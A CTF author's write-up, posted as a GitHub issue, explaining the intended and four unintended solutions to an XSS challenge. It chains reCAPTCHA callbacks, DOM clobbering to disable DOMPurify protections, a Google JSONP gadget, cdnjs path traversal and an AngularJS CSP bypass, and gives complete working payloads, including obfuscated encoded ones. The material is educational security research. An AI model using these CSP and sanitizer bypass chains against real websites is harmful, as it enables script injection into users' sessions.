
##
#
"Notes" XSS Challenge Author Writeup #55
#
https://github.com/aszx87410/ctf-writeups/issues/55
#
##

"Notes" XSS Challenge Author Writeup #55
Open
aszx87410 opened this issue on Apr 12, 2022 · 0 comments
Comments
@aszx87410
Owner
aszx87410 commented on Apr 12, 2022
Last month, I created an XSS challenge and hosted it on my GitHub: https://aszx87410.github.io/xss-challenge/notes/

螢幕快照 2022-04-12 下午11 16 21

This is the writeup about the challenge and solutions, including intended and unintended.

I will start from the intended one.

Overview
Let's look at the challenge, it's a simple but compacted app with ~100 lines JS and not-so-strict CSP:
```
<meta
  http-equiv="Content-Security-Policy"
  content="
    default-src 'self';
    script-src 'self' https://www.gstatic.com/ 
     https://www.google.com/ 
     https://cdnjs.cloudflare.com/ajax/libs/dompurify/;
     
    frame-src https://www.google.com/ https://recaptcha.google.com/;
    style-src 'self' 'unsafe-inline';
  ">
```

##
##

```
app.js:

String.prototype.encode = function(type) {
  if (!type) return this
  if (type === 'uri') return encodeURIComponent(this)
  if (type === 'json') return JSON.stringify(this)
  if (type === 'base64') return atob(this)
}

const inputContent = document.querySelector('#input-content')
const renderer = document.querySelector('#renderer')
document.querySelector('#clear').onclick = function(e) {
  e.preventDefault()
  inputContent.value = ""
}

document.querySelector('#reload').onclick = function(e) {
  e.preventDefault()
  reloadRecaptchaScript(0)
  document.querySelector('#reload').style = "display:none"
}

function onSubmit() {
  const content = inputContent.value
  const name = document.querySelector('input[name=creator]').value
  const qs = 'name=' + name.encode('uri') + '&content=' + content.encode('uri')
  window.location.search = '?' + qs
}

function loadScript(src) {
  const script = document.createElement('script');
  script.async = true;
  script.src = src;
  if (script.src.includes('jsonp') || decodeURIComponent(script.src).includes('jsonp')) {
    throw new Error('dangerous keyword detected')
  }
  document.body.appendChild(script);
}

function reloadRecaptchaScript(index) {
  // delay for a bit to not block main thread
  setTimeout(() => {
    console.log('reload', index, document.scripts[index])
    const element = document.scripts[index]
    const src = element.getAttribute('src')
    if (!src.startsWith('https://www.google.com/recaptcha/')) {
      throw new Error('reload failed, invalid src')
    }
    element.parentNode.removeChild(element)
    loadScript(src)
  }, 1000)
}

function sanitize(html, options = defaultOptions) {
  return DOMPurify.sanitize(html, {
    FORBID_TAGS: options.blockTags || [],
    FORBID_ATTR: options.blockAttrs || [],
    FORCE_BODY: options.forceBody,
    WHOLE_DOCUMENT: options.wholeDocument,
    KEEP_CONTENT: !options.removeContent,
    SANITIZE_DOM: !options.allowDOM,
  })
}

function loadData(sanitizeOptions) {
  const params = (new URL(document.location)).searchParams
  const name = params.get('name')
  const content = params.get('content')

  if (!content) return

  // hide some elements, we don't need it
  document.querySelector('.title').innerText = 'Note'
  document.querySelector('.input-type').style = 'display: none';
  document.querySelector('.input-date').style = 'display: none';
  document.querySelector('.input-mode').style = 'display: none';
  document.querySelector('#input-content').style = 'display: none';
  document.querySelector('#submit').style = 'display: none';
  document.querySelector('#clear').style = 'display: none';
  document.querySelector('#reload').style = "display:none"

  document.querySelector('input[name=creator]').value = name
  const result = sanitize(content, sanitizeOptions)
  renderer.style = "width:100%; min-height: 400px;display: block"
  renderer.innerHTML = result
}

loadData({
  blockTags: ['style', 'iframe', 'embed', 'input', 'svg', 'script', 'math', 'base', 'link'],
  blockAttrs: [],
  forceBody: false,
  wholeDocument: false,
  allowDOM: false,
  removeContent: true
})


```
When the app is loaded, in loadData function, it reads data from the URL and then renders it to innerHTML after sanitized, that's all.

For sanitizing, the config is pretty much the default one, so you can't perform XSS directly unless you find a 0-day bypass:

```
function sanitize(html, options = defaultOptions) {
  return DOMPurify.sanitize(html, {
    FORBID_TAGS: options.blockTags || [],
    FORBID_ATTR: options.blockAttrs || [],
    FORCE_BODY: options.forceBody,
    WHOLE_DOCUMENT: options.wholeDocument,
    KEEP_CONTENT: !options.removeContent,
    SANITIZE_DOM: !options.allowDOM,
  })
}

loadData({
  blockTags: ['style', 'iframe', 'embed', 'input', 'svg', 'script', 'math', 'base', 'link'],
  blockAttrs: [],
  forceBody: false,
  wholeDocument: false,
  allowDOM: false,
  removeContent: true
})
```



What can we do by injecting a harmless HTML? Not much, unless you leverage another functionality.

reCAPTCHA to the rescue
Somehow, the challenge uses Google reCAPTCHA, and from their docs we know that we can trigger a function call by injecting the following HTML:


```
<div
  class="g-recaptcha"
  data-sitekey="AAA"
  data-error-callback="any_function_here"
  data-size="invisible">
</div>
```


By providing a random wrong sitekey, reCAPTCHA will call the function in the attribute data-error-callback.

It's important that DOMPurify allows any attributes that start with data- by default, and also both class and id are permitted.

I learned this nifty trick from TSJ CTF 2022 - web/Nim Notes, but it seems that it's from another XSS challenge made by @terjanq in TokyoWesterns CTF 2020.

Now, we can call a function by injecting HTML. The question is, what function should we call?

Both loadScript and reloadRecaptchaScript are suspicious, but loadScript might not be a good target because we can't control the arguments.

How about reloadRecaptchaScript?

```
function reloadRecaptchaScript(index) {
  // delay for a bit to not block main thread
  setTimeout(() => {
    console.log('reload', index, document.scripts[index])
    const element = document.scripts[index]
    const src = element.getAttribute('src')
    if (!src.startsWith('https://www.google.com/recaptcha/')) {
      throw new Error('reload failed, invalid src')
    }
    element.parentNode.removeChild(element)
    loadScript(src)
  }, 1000)
}
```

If we can control document.scripts[index], we can load another script from https://www.google.com.

When the reCAPTCHA calls a function, it passes no argument, so the index will be undefined, so we need to override document.scripts['undefined']

Can we control it? Sure, it's DOM clobbering time!

DOM clobbering
Usually, we can override the attribute on document by providing a embed, form, input, object or img with name, like this:
```
<img name="scripts">
// document.scripts => <img>
Combining with form element, we can clobber document.scripts['undefined']:

<form name="scripts">
  <img name="undefined" src="src">
</form>
But, it's not working because DOMPurify prevents this behavior by default: https://github.com/cure53/DOMPurify/blob/main/src/purify.js#L1015

if (
  SANITIZE_DOM &&
  (lcName === 'id' || lcName === 'name') &&
  (value in document || value in formElement)
) {
  return false;
}
Fortunately, there is another vulnerability in the code:

function sanitize(html, options = defaultOptions) {
  return DOMPurify.sanitize(html, {
    FORBID_TAGS: options.blockTags || [],
    FORBID_ATTR: options.blockAttrs || [],
    FORCE_BODY: options.forceBody,
    WHOLE_DOCUMENT: options.wholeDocument,
    KEEP_CONTENT: !options.removeContent,
    SANITIZE_DOM: !options.allowDOM,
  })
}
```


When calling sanitize without options, the default value will be defaultOptions, so we can clobber defaultOptions.allowDOM to make SANITIZE_DOM falsy.

Also, we need to call loadData() again without any arguments to let sanitizeOptions be undefined.

To sum up, we can control document.scripts['undefined'] by providing below HTML:

```
<div>
  <form></form>
  <form name="scripts">
    <img name="undefined" src="src_here">
  </form>
  <form id=defaultOptions>
    <img name=allowDOM>
  </form>
  <div class="g-recaptcha"
    data-sitekey="AAA"
    data-error-callback="reloadRecaptchaScript"
    data-size="invisible">
  </div>
  <div class="g-recaptcha"
    data-sitekey="BBB"
    data-error-callback="loadData"
    data-size="invisible">
  </div>
</div>
```

Load external script
Now, we have control on document.scripts[index], but we still need to bypass another check:

```
function reloadRecaptchaScript(index) {
  setTimeout(() => {
    console.log('reload', index, document.scripts[index])
    const element = document.scripts[index]
    const src = element.getAttribute('src')
    if (!src.startsWith('https://www.google.com/recaptcha/')) {
      throw new Error('reload failed, invalid src')
    }
    element.parentNode.removeChild(element)
    loadScript(src)
  }, 1000)
}
```


The src should start with https://www.google.com/recaptcha/, how to overcome this?

There is a subtle difference between element.src and element.getAttribute('src'), the former returns the formatted value, while the latter returns raw value:

<img src="https://example.com/abc/../test">
// img.src => https://example.com/test
// img.getAttribute('src') => https://example.com/abc/../test
By using ../, we can load any scripts from https://www.google.com.

It's easy to find a useful gadget from JSONBee: https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1

The response is like:

alert && alert(["hello",["hello kitty","hello world","hello kiki","hellolulu","hello venus","hello nico","hello bubble"],["","","","","","","",""],[],{"google:clientdata":{"bpc":false,"phi":0,"tlw":false},"google:suggestrelevance":[601,600,555,554,553,552,551,550],"google:suggestsubtypes":[[512,433],[512,433,131],[512,433,131],[512],[512,433],[512],[512],[512,433,131]],"google:suggesttype":["QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY"],"google:verbatimrelevance":1300}])
We can't run arbitrary JS because callback is restricted, it won't work if you pass something like alert(document.domain), but we have the ability to call a function with controlled arguments.

The idea is simple, we can use it to load AngularJS from cdn.js by leverage the classic ..%2f trick.

https://www.google.com/recaptcha/../complete/search?client=chrome&q=https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%252fangular.js/1.8.2/angular.js%23&callback=loadScript
Response:

loadScript && loadScript(["https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%2fangular.js/1.8.2/angular.js#",[],[],[],{"google:clientdata":{"bpc":false,"tlw":false},"google:suggesttype":[],"google:verbatimrelevance":1300}])
AngularJS CSP bypass
Here comes the last part of the challenge. The goal is to find an AngularJS CSP bypass and XSS without user interaction.

There is a classic payload as described in:

Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup
H5SC Minichallenge 3: "Sh*t, it's CSP!"
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/..%252fprototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/..%252fangular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>

{{$on.curry.call().alert(1)}}

</div>
It requires no user interaction, perfect! But there are two other issues we need to address.

First, ng-app and ng-csp will be removed by DOMPurify. Second, there is no prototype.js.

For the first issue, we can use data-ng-app and data-ng-csp instead of ng-app and ng-csp, because AngularJS will normalize attribute names, and remove x- and data- prefixes.

For the second issue, we need to know why prototype.js is needed.

It's needed because prototype.js adds a few methods to different prototype, like Function.prototype:

function curry() {
  if (!arguments.length) return this;
  var __method = this, args = slice.call(arguments, 0);
  return function() {
    var a = merge(args, arguments);
    return __method.apply(this, a);
  }
}
The first argument of fn.call() is this, if you call this function without providing this, the default value of this is window in non-strict mode.

So, any_function.curry.call() will return this which is window, that's why we need prototype.js.

If you look at the source code again, you can find a similar pattern:

String.prototype.encode = function(type) {
  if (!type) return this
  if (type === 'uri') return encodeURIComponent(this)
  if (type === 'json') return JSON.stringify(this)
  if (type === 'base64') return atob(this)
}
That is to say, we can get window via "any_string".encode.call().

Piece all together
The full exploit including:

DOM clobbering window.defaultOptions.allowDOM to allow clobber document
DOM clobbering document.scripts['undefined']
Call loadData via reCAPTCHA
Call reloadRecaptchaScript via reCAPTCHA
Load AngularJS from cdn.js by classic google gadget and ..%2f trick
Use data-ng-app instead of ng-app to bypass DOMPurify
Use "".encode.call() to get window object
Here is the final payload for the intended solution:

link

<div>
  <form></form>
  <form name="scripts">
    <img name="undefined" src="https://www.google.com/recaptcha/../complete/search?client=chrome&q=https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%252fangular.js/1.8.2/angular.js%23&callback=loadScript">
  </form>
  <form id=defaultOptions>
    <img name=allowDOM>
  </form>
    <div class="g-recaptcha" data-sitekey="AAA" data-error-callback="reloadRecaptchaScript" data-size="invisible"></div>
  <div class="g-recaptcha" data-sitekey="B" data-error-callback="loadData" data-size="invisible"></div>
  
  <div data-ng-app data-ng-csp>
    {{ "abc".encode.call().alert("abc".encode.call().document.domain) }}
  </div>
</div>
Unintended
Besides the intended solution, there are 4 amazing unintended solutions.

Unintended #1 by @maple3142
At first, I didn't know there was a jsonp argument in https://www.google.com/complete/search endpoint, so there was no check for jsonp.

It's east to get a XSS by loading something like https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(document.domain)//

Later on, I implemented a check for jsonp in reloadRecaptchaScript:

if (src.includes('jsonp') || decodeURIComponent(src).includes('jsonp')) {
  throw new Error('dangerous keyword detected')
}
Unintended #2 by @smaury92
It turns out that I implemented a flawed check, can you spot the bug?

You can bypass the check by open redirect and double encoded the https://google.com/complete/search call, like this:

reloadRecaptchaScript('https://www.google.com/recaptcha/../url?q=https://www.google.com/complete/search?client=chrome%26q=%25%36%38%25%37%34%25%37%34%25%37%30%25%37%33%25%33%61%25%32%66%25%32%66%25%37%37%25%37%37%25%37%37%25%32%65%25%36%37%25%36%66%25%36%66%25%36%37%25%36%63%25%36%35%25%32%65%25%36%33%25%36%66%25%36%64%25%32%66%25%36%33%25%36%66%25%36%64%25%37%30%25%36%63%25%36%35%25%37%34%25%36%35%25%32%66%25%37%33%25%36%35%25%36%31%25%37%32%25%36%33%25%36%38%25%33%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%33%64%25%36%33%25%36%38%25%37%32%25%36%66%25%36%64%25%36%35%25%32%36%25%36%61%25%37%33%25%36%66%25%36%65%25%37%30%25%33%64%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34%25%32%38%25%36%34%25%36%66%25%36%33%25%37%35%25%36%64%25%36%35%25%36%65%25%37%34%25%32%65%25%36%34%25%36%66%25%36%64%25%36%31%25%36%39%25%36%65%25%32%39%25%32%66%25%32%66%2523%26callback=loadScript%231')
So it passed the check for reloadRecaptchaScript.

I decided the move the check from reloadRecaptchaScript to loadScript: aszx87410/xss-challenge@7382e9b

Unintended #3 by @lbrnli1234
The check failed again.

payload:

reloadRecaptchaScript('https://www.google.com/recaptcha/../url?q=https%3A%2F%2Fwww.google.com%2Fcomplete%2Fsearch%3Fclient%3Dhp%26q%3Da%26%256asonp%3Dalert(document.domain)')
I was aware of google open redirect but I didn't notice a subtle difference. When I tried google open redirect, it returned 200 in that case and used client side redirect: https://www.google.com/url?q=https%3A%2F%2Ftech-blog.cymetrics.io&sa=D&sntz=1&usg=AFQjCNHyq6urHn6HLwj8RP09GANAlymZug

So I thought it was impossible to leverage this open redirect.

But for some other cases, it returns 302: https://www.google.com/url?sa=t&url=http://example.org/&usg=AOvVaw1YigBkNF7L7D2x2Fl532mA

Anyway, I didn't fix this unintended in the end because I don't have a good solution at the moment.

Unintended #4 by @lbrnli1234
Another dope unintended has been found:

https://aszx87410.github.io/xss-challenge/notes/?name=&content=<p class=g-recaptcha data-sitekey=x data-error-callback=reloadRecaptchaScript></p>
<p class=g-recaptcha data-sitekey=x data-error-callback=reloadRecaptchaScript></p>
<p class=g-recaptcha data-sitekey=x data-error-callback=loadData></p>
<form></form>
<form id=defaultOptions><img id=allowDOM></form>
<form name=scripts>
<input id=undefined src='https://www.google.com/recaptcha/../complete/search?client=hp&q=https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.0/purify.min.js%23&callback=loadScript'>
<img id=undefined src='https://www.google.com/recaptcha/../jsapi?callback=loadData'>
</form>
<form><math><mtext></form><form><mglyph><style></math><iframe srcdoc='
&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x73;&#x72;&#x63;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x63;&#x64;&#x6e;&#x6a;&#x73;&#x2e;&#x63;&#x6c;&#x6f;&#x75;&#x64;&#x66;&#x6c;&#x61;&#x72;&#x65;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x61;&#x6a;&#x61;&#x78;&#x2f;&#x6c;&#x69;&#x62;&#x73;&#x2f;&#x64;&#x6f;&#x6d;&#x70;&#x75;&#x72;&#x69;&#x66;&#x79;&#x2f;&#x2e;&#x2e;&#x25;&#x32;&#x66;&#x70;&#x72;&#x6f;&#x74;&#x6f;&#x74;&#x79;&#x70;&#x65;&#x2f;&#x31;&#x2e;&#x37;&#x2e;&#x32;&#x2f;&#x70;&#x72;&#x6f;&#x74;&#x6f;&#x74;&#x79;&#x70;&#x65;&#x2e;&#x6a;&#x73;&#x22;&#x3e;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#xa;&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x73;&#x72;&#x63;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x63;&#x64;&#x6e;&#x6a;&#x73;&#x2e;&#x63;&#x6c;&#x6f;&#x75;&#x64;&#x66;&#x6c;&#x61;&#x72;&#x65;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x61;&#x6a;&#x61;&#x78;&#x2f;&#x6c;&#x69;&#x62;&#x73;&#x2f;&#x64;&#x6f;&#x6d;&#x70;&#x75;&#x72;&#x69;&#x66;&#x79;&#x2f;&#x2e;&#x2e;&#x25;&#x32;&#x66;&#x61;&#x6e;&#x67;&#x75;&#x6c;&#x61;&#x72;&#x2e;&#x6a;&#x73;&#x2f;&#x31;&#x2e;&#x30;&#x2e;&#x31;&#x2f;&#x61;&#x6e;&#x67;&#x75;&#x6c;&#x61;&#x72;&#x2e;&#x6a;&#x73;&#x22;&#x3e;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#xa;&#x3c;&#x64;&#x69;&#x76;&#x20;&#x6e;&#x67;&#x2d;&#x61;&#x70;&#x70;&#x20;&#x6e;&#x67;&#x2d;&#x63;&#x73;&#x70;&#x3e;&#x7b;&#x7b;&#x24;&#x6f;&#x6e;&#x2e;&#x63;&#x75;&#x72;&#x72;&#x79;&#x2e;&#x63;&#x61;&#x6c;&#x6c;&#x28;&#x29;&#x2e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x24;&#x6f;&#x6e;&#x2e;&#x63;&#x75;&#x72;&#x72;&#x79;&#x2e;&#x63;&#x61;&#x6c;&#x6c;&#x28;&#x29;&#x2e;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x6d;&#x61;&#x69;&#x6e;&#x29;&#x7d;&#x7d;&#x3c;&#x2f;&#x64;&#x69;&#x76;&#x3e;
'></iframe>
The content of srcdoc is the classic angularJS CSP bypass payload we mentioned

<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%2fprototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%2fangular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>{{$on.curry.call().alert($on.curry.call().document.domain)}}</div>
The flow is like:

reCAPTCHA triggers reloadRecaptchaScript(), will be run after 1s
reCAPTCHA triggers reloadRecaptchaScript(), will be run after 1s
reCAPTCHA triggers loadData(), run immediately and pollute document.scripts['undefined']
Run the function in step 1, load src from <input>, call loadScript('https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.0/purify.min.js')
Run the function in step 2, load src from <img>, call loadScript('https://www.google.com/recaptcha/../jsapi?callback=loadData') to trigger loadData again
Old version of DOMPurify has loaded (the lib we load in step 4), override latest one
Script at step 5 also loaded, loadData has been called again
Now, the DOMPurify is the old and flawed version, so we can bypass it easily
It sometimes fails because of race conditions.

For example, if script at step 5 is loaded(called loadDate) before DOMPurify, we still use the latest version, so there is no way to bypass it.

The author created an HTML page and embedded a few <iframe> to load the URL many times to solve the issue.

Takeaways
Everything can be abuse
Existing JS code might be helpful sometimes
Knowing the default behavior of third party libraries is helpful
I hope you did learn something new and enjoyed this challenge, thanks for playing the game!

@aszx87410 aszx87410 added the Web label on Apr 12, 2022
